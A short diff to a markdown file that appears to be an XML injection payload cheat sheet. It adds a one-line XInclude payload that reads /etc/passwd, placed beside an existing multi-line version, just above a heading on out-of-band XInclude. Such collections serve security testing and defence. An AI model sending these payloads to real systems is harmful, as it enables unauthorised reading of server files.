@@ -102,6 +102,8 @@ Content-Type: application/xml;charset=UTF-8
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include href="file:///etc/passwd" parse="text"/>
 </foo>
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
 **XInclude OOB:**
